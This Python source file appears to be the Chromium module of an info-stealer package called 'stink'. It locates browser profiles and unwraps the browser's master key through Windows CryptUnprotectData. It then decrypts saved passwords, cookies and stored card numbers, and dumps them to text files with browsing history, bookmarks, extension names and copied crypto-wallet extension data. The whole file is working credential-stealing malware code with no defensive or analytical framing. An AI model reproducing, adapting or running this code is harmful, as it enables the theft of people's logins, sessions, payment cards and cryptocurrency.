from re import compile
from typing import Tuple
from base64 import b64decode
from json import load, loads
from shutil import copyfile, copytree
from datetime import datetime, timedelta
from os import path, makedirs, remove, listdir
from sqlite3 import connect, Connection, Cursor
from ctypes import windll, byref, cdll, c_buffer

from stink.helpers import DataBlob
from stink.enums.features import Features
from stink.utils import AESModeOfOperationGCM
from stink.helpers.config import ChromiumConfig


class Chromium:
    """
    Collects data from the browser.
    """
    def __init__(self, browser_name: str, storage_path: str, state_path: str, browser_path: str, statuses: list):

        self.__browser_name = browser_name
        self.__storage_path = storage_path
        self.__state_path = state_path
        self.__browser_path = browser_path
        self.__statuses = statuses
        self.__profiles = None

        self.__config = ChromiumConfig()
        self.__path = path.join(self.__storage_path, "Browsers", self.__browser_name)

    def _get_profiles(self) -> list:
        """
        Collects all browser profiles.

        Parameters:
        - None.

        Returns:
        - list: List of all browser profiles.
        """
        if self.__browser_path[-9:] in ["User Data"]:

            pattern = compile(r"Default|Profile \d+")
            return [path.join(self.__browser_path, profile) for profile in sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])]

        return [self.__browser_path]

    def _check_paths(self) -> None:
        """
        Checks if a browser is installed and if data collection from it is enabled.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if path.exists(self.__browser_path) and any(self.__statuses):

            makedirs(path.join(self.__storage_path, "Browsers", self.__browser_name))
            self.__profiles = self._get_profiles()

    @staticmethod
    def _crypt_unprotect_data(encrypted_bytes: b64decode, entropy: bytes = b'') -> bytes:
        """
        Decrypts data previously encrypted using Windows CryptProtectData function.

        Parameters:
        - encrypted_bytes [b64decode]: The encrypted data to be decrypted.
        - entropy [bytes]: Optional entropy to provide additional security during decryption.

        Returns:
        - bytes: Decrypted data as bytes.
        """
        blob = DataBlob()

        if windll.crypt32.CryptUnprotectData(byref(DataBlob(len(encrypted_bytes), c_buffer(encrypted_bytes, len(encrypted_bytes)))), None, byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))), None, None, 0x01, byref(blob)):

            buffer = c_buffer(int(blob.cbData))
            cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
            windll.kernel32.LocalFree(blob.pbData)

            return buffer.raw

    def _get_key(self) -> bytes:
        """
        Receives the decryption key.

        Parameters:
        - None.

        Returns:
        - bytes: Decryption key.
        """
        with open(self.__state_path, "r", encoding="utf-8") as state:
            file = state.read()

        state.close()

        return self._crypt_unprotect_data(b64decode(loads(file)["os_crypt"]["encrypted_key"])[5:])

    @staticmethod
    def _get_datetime(date: int) -> str:
        """
        Converts timestamp to date.

        Parameters:
        - date [int]: Date to be converted.

        Returns:
        - str: Converted date or error message.
        """
        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
        except:
            return "Can't decode"

    @staticmethod
    def _decrypt(value: bytes, master_key: bytes) -> str:
        """
        Decrypts the value with the master key.

        Parameters:
        - value [bytes]: The value to be decrypted.
        - master_key [bytes]: Decryption key.

        Returns:
        - str: Decrypted string.
        """
        try:
            return AESModeOfOperationGCM(master_key, value[3:15]).decrypt(value[15:])[:-16].decode()
        except:
            return "Can't decode"

    @staticmethod
    def _get_db_connection(database: str) -> Tuple[Cursor, Connection]:
        """
        Creates a connection with the database.

        Parameters:
        - database [str]: Path to database.

        Returns:
        - tuple: Cursor and Connection objects.
        """
        connection = connect(
            f"file:{database}?mode=ro&immutable=1",
            uri=True,
            isolation_level=None,
            check_same_thread=False
        )
        cursor = connection.cursor()

        return cursor, connection

    @staticmethod
    def _get_file(file_path: str) -> str:
        """
        Reads the file contents.

        Parameters:
        - file_path [str]: Path to file.

        Returns:
        - str: File content.
        """
        with open(file_path, "r", encoding="utf-8") as file:
            data = file.read()

        return data

    def _copy_files(self, profile: str, destination_path: str, target_path: str, error: str = "") -> bool:
        """
        Copies the file/directory or prints an error if it is not found.

        Parameters:
        - profile [str]: Browser profile.
        - destination_path [str]: Destination path.
        - target_path [str]: Path of the file or directory to be copied.
        - error [str]: Error that will be displayed if the path does not exist.

        Returns:
        - bool: True or False depending on the success of the execution.
        """
        if path.isfile(target_path):
            copy = copyfile
        else:
            copy = copytree

        if path.exists(target_path):
            copy(target_path, destination_path)
        else:
            print(f'[{self.__browser_name}]: {profile} - {error}')
            return False

        return True

    def _grab_passwords(self, profile: str, file_path: str) -> None:
        """
        Collects browser passwords.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        cursor, connection = self._get_db_connection(file_path)
        passwords_list = cursor.execute(self.__config.PasswordsSQL).fetchall()

        cursor.close()
        connection.close()

        if not passwords_list:
            return

        data = self.__config.PasswordsData
        temp = [
            data.format(result[0], result[1], self._decrypt(result[2], self.__master_key))
            for result in passwords_list
        ]

        with open(path.join(self.__path, rf"{profile} Passwords.txt"), "a", encoding="utf-8") as passwords:
            passwords.write("".join(item for item in set(temp)))

        passwords.close()

    def _grab_cookies(self, profile: str, file_path: str) -> None:
        """
        Collects browser cookies.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        cursor, connection = self._get_db_connection(file_path)
        cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()

        cursor.close()
        connection.close()

        if not cookies_list:
            return

        cookies_list_filtered = [row for row in cookies_list if row[0] != ""]

        data = self.__config.CookiesData
        temp = [
            data.format(row[0], row[1], self._decrypt(row[2], self.__master_key))
            for row in cookies_list_filtered
        ]

        with open(path.join(self.__path, rf"{profile} Cookies.txt"), "a", encoding="utf-8") as cookies:
            cookies.write("\n".join(row for row in temp))

        cookies.close()

    def _grab_cards(self, profile: str, file_path: str) -> None:
        """
        Collects browser cards.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        cursor, connection = self._get_db_connection(file_path)
        cards_list = cursor.execute(self.__config.CardsSQL).fetchall()

        cursor.close()
        connection.close()

        if not cards_list:
            return

        data = self.__config.CardsData
        temp = [
            data.format(result[0], self._decrypt(result[3], self.__master_key), result[1], result[2])
            for result in cards_list
        ]

        with open(path.join(self.__path, rf"{profile} Cards.txt"), "a", encoding="utf-8") as cards:
            cards.write("".join(item for item in set(temp)))

        cards.close()

    def _grab_history(self, profile: str, file_path: str) -> None:
        """
        Collects browser history.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        cursor, connection = self._get_db_connection(file_path)
        results = cursor.execute(self.__config.HistorySQL).fetchall()
        history_list = [cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone() for item in results]

        cursor.close()
        connection.close()

        if not results:
            return

        data = self.__config.HistoryData
        temp = [
            data.format(result[0], result[1], self._get_datetime(result[2]))
            for result in history_list
        ]

        with open(path.join(self.__path, rf"{profile} History.txt"), "a", encoding="utf-8") as history:
            history.write("".join(item for item in set(temp)))

        history.close()

    def _grab_bookmarks(self, profile: str, file_path: str) -> None:
        """
        Collects browser bookmarks.

        Parameters:
        - profile [str]: Browser profile.
        - main_path [str]: Path of the file to be processed.
        - alt_path [str]: Spare path of the file to be processed.

        Returns:
        - None.
        """
        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Bookmarks")

        if self._copy_files(profile, filename, file_path, "No bookmarks found") is False:
            return

        file = self._get_file(filename)
        bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in file.split("{")], [])

        remove(filename)

        if not bookmarks_list:
            return

        data = self.__config.BookmarksData
        temp = [
            data.format(result[0], result[1])
            for result in bookmarks_list
        ]

        with open(path.join(self.__path, rf"{profile} Bookmarks.txt"), "a", encoding="utf-8") as bookmarks:
            bookmarks.write("".join(item for item in set(temp)))

        bookmarks.close()

    def _grab_extensions(self, profile: str, extensions_path: str) -> None:
        """
        Collects browser extensions.

        Parameters:
        - profile [str]: Browser profile.
        - extensions_path [str]: Path to the extensions directory.

        Returns:
        - None.
        """
        extensions_list = []
        extensions_dirs = listdir(extensions_path)

        if len(extensions_dirs) == 0:
            return

        for dirpath in extensions_dirs:

            extension_dir = listdir(path.join(extensions_path, dirpath))

            if len(extension_dir) == 0:
                continue

            extension_dir = extension_dir[-1]
            manifest_path = path.join(extensions_path, dirpath, extension_dir, "manifest.json")

            with open(manifest_path, "r", encoding="utf-8") as file:
                manifest = load(file)
                name = manifest.get("name")

                if name:
                    extensions_list.append(name)

            file.close()

        with open(path.join(self.__path, rf"{profile} Extensions.txt"), "a", encoding="utf-8") as extensions:
            extensions.write("\n".join(item for item in set(extensions_list)))

        extensions.close()

    def _grab_wallets(self, profile: str, wallets: str) -> None:
        """
        Collects browser wallets.

        Parameters:
        - profile [str]: Browser profile.
        - wallets [str]: Path to the wallets directory.

        Returns:
        - None.
        """
        for wallet in self.__config.WalletLogs[self.__browser_name]:

            try:

                filename = path.join(self.__path, rf'{profile} {wallet["name"]}')
                self._copy_files(profile, filename, path.join(wallets, wallet["folder"]), f'No {wallet["name"]} found')

            except Exception as e:
                print(f"[{self.__browser_name}]: {repr(e)}")

    def _process_profile(self, profile: str) -> None:
        """
        Collects browser profile data.

        Parameters:
        - profile [str]: Browser profile.

        Returns:
        - None.
        """
        profile_name = profile.replace("\\", "/").split("/")[-1]
        functions = [
            {
                "method": self._grab_passwords,
                "arguments": [profile_name, path.join(profile, "Login Data")],
                "status": True if Features.passwords in self.__statuses else False
            },
            {
                "method": self._grab_cookies,
                "arguments": [profile_name, path.join(profile, "Network", "Cookies")],
                "status": True if Features.cookies in self.__statuses else False
            },
            {
                "method": self._grab_cards,
                "arguments": [profile_name, path.join(profile, "Web Data")],
                "status": True if Features.cards in self.__statuses else False
            },
            {
                "method": self._grab_history,
                "arguments": [profile_name, path.join(profile, "History")],
                "status": True if Features.history in self.__statuses else False
            },
            {
                "method": self._grab_bookmarks,
                "arguments": [profile_name, path.join(profile, "Bookmarks")],
                "status": True if Features.bookmarks in self.__statuses else False
            },
            {
                "method": self._grab_extensions,
                "arguments": [profile_name, path.join(profile, "Extensions")],
                "status": True if Features.bookmarks in self.__statuses else False
            },
            {
                "method": self._grab_wallets,
                "arguments": [profile_name, path.join(profile, "Local Extension Settings")],
                "status": True if Features.wallets in self.__statuses else False
            }
        ]

        for function in functions:

            try:

                if function["status"] is False:
                    continue

                function["method"](*function["arguments"])

            except Exception as e:
                print(f"[{self.__browser_name}]: {repr(e)}")

    def _check_profiles(self) -> None:
        """
        Collects data for each browser profile.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not self.__profiles:
            print(f"[{self.__browser_name}]: No profiles found")
            return

        self.__master_key = self._get_key()

        for profile in self.__profiles:
            self._process_profile(profile)

    def run(self) -> None:
        """
        Launches the browser data collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self._check_paths()
            self._check_profiles()

        except Exception as e:
            print(f"[{self.__browser_name}]: {repr(e)}")
